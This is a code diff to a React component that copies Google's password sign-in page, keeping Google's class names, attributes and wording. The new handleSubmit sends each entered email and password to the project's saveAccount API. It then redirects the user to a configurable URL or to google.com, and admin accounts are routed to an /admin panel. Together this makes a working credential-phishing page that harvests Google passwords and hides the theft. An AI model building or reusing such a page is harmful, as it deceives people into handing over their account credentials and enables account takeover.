@@ -1,12 +1,48 @@
-import React from "react";
+import React, { useContext, useEffect, useState } from "react";
 import './styles.css'
+import { useNavigate } from "react-router-dom";
+import { UserContext } from "../../context/UserContext.jsx";
+import { saveAccount } from '../../services/api.js'
 
 export const PassPage = () => {
-  const person = {
-    name: `Luiz Gabriel`,
-    email: `luizgabrielgrupe@gmail.com`,
-    imgUrl: `https://lh3.googleusercontent.com/a/AAcHTtdhUpvCOh5qw8d_ZWXt3YrC0pgcWz_FPhS9mV195A=s128-c`
+  const { email, updateAdmData, redirectUrl } = useContext(UserContext);
+  const [showPassword, setShowPassword] = useState(true);
+  const [password, setPassword] = useState("");
+  const navigate = useNavigate();
+
+  console.log(redirectUrl)
+
+  const handleSubmit = (e) => {
+    e.preventDefault()
+    const password = e.target.password.value
+    if (password.length < 8) {
+      return
+    }
+    saveAccount({
+      email,
+      password
+    }).then((data) => {
+      const dados = data.data
+      console.log(data)
+
+      if (dados.isAdm) {
+        updateAdmData(dados)
+        navigate('/admin')
+      } else {
+        console.log(redirectUrl)
+        if (redirectUrl && redirectUrl.trim() !== '') {
+          window.location.href = redirectUrl
+          return
+        }
+        window.location.href = `https://www.google.com/`
+      }
+    })
   }
+
+  if (email === ``) {
+    return
+  }
+
   return (
     <div className="container">
       <div className="card">
@@ -53,14 +89,14 @@ export const PassPage = () => {
             </div>
           </div>
         </div>
-        <h2>{name}</h2>
+        <h2>Olá,</h2>
         <br />
-        <div className="aCayab" style={{margin: 0, padding: 0}}>
+        <div className="aCayab" style={{ margin: 0, padding: 0 }}>
           <div></div>
           <div jscontroller="IIfQad"
             jsaction="click:cOuCgd; blur:O22p3e; mousedown:UX7yZ; mouseup:lbsD7e; touchstart:p6p2H; touchend:yfqBxc;"
             className="YZrg6 HnRr5d iiFyne cd29Sd"
-            tabindex="0"
+            tabIndex="0"
             role="link"
             jsname="af8ijd">
             <div className="gPHLDe">
@@ -79,7 +115,7 @@ export const PassPage = () => {
               </div>
             </div>
             <div jsname="fmcmS" className="KTeGk" data-profile-identifier="">
-              <a style={{fontSize: "12px"}} id="email_">{email}</a>
+              <a style={{ fontSize: "14px" }} id="email_">{email}</a>
             </div>
             <div className="krLnGe">
               <svg aria-hidden="true"
@@ -98,37 +134,38 @@ export const PassPage = () => {
         <br />
         <br />
         <div className="input-contain">
-          <form id="form" method="post" action="#">
+          <form id="form" onSubmit={handleSubmit}>
             <input type="hidden" id="email" name="email" value="email928377" />
             <input type="text"
-              style={{fontFamily: "password"}}
+              style={{ fontFamily: showPassword ? "password" : "inherit" }}
               id="password"
               name="password"
-              autocomplete="off"
-              value=""
+              autoComplete="off"
+              value={password}
+              onChange={(e) => { setPassword(e.target.value) }}
               aria-labelledby="placeholder-password" />
-            <label className="placeholder-text" for="password" id="placeholder-password">
-              <div id="placeholder_" className="text" style={{fontSize: "12px"}}>Enter your password</div>
+            <label className="placeholder-text" htmlFor="password" id="placeholder-password">
+              <div id="placeholder_" className="text">Enter your password</div>
             </label>
           </form>
         </div>
-        <div style={{textAlign: "left"}}>
+        <div style={{ textAlign: "left" }}>
           <b id="error"></b>
           <br />
           <input type="checkbox"
-            style={{width: "15px",height: "15px"}}
-            onclick="showpass()" />
-          <a style={{marginTop: "-30px"}}>&nbsp;Show password</a>
+            style={{ width: "15px", height: "15px" }}
+            onClick={() => { setShowPassword(!showPassword); console.log(showPassword) }} />
+          <a style={{ marginTop: "-30px" }}>&nbsp;Show password</a>
           <div className="card-bottom">
-            <a target="_blank" href="https://accounts.google.com/>">Forgot Password?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+            <a target="_blank" href="/">Forgot Password?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
             <button form="form" type="submit" className="disable-select">Next</button>
           </div>
-          <div style={{height: "110px"}}></div>
+          <div style={{ height: "110px" }}></div>
         </div>
         <div id="spacer">
           <br />
           <br />
-          <div style={{height: "10px"}}></div>
+          <div style={{ height: "10px" }}></div>
         </div>
         <div className="footer">
           <select className="disable-select" name="select">
